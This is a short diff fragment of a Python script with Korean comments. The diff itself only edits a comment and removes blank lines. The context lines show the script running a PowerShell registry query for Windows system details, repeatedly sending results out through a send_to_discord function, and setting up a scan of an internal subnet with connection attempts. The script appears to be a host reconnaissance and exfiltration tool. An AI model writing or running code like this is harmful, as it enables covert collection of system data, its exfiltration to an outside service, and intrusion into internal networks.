@@ -309,7 +309,7 @@ if __name__ == "__main__":
     start_command('Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion"')
     send_to_discord(" . ")
 
-    # 스캔 + 접속 시도 -> 제대로 스캔이 되지 않음.
+    # # 스캔 + 접속 시도 -> 제대로 스캔이 되지 않음.
     private_ips = [
         ipaddress.IPv4Network('172.20.21.0/25')
     ]
@@ -364,11 +364,3 @@ if __name__ == "__main__":
     send_to_discord(" . ")
 
     send_to_discord("######### 끝! #########")
-
-
-
-
-
-
-
-
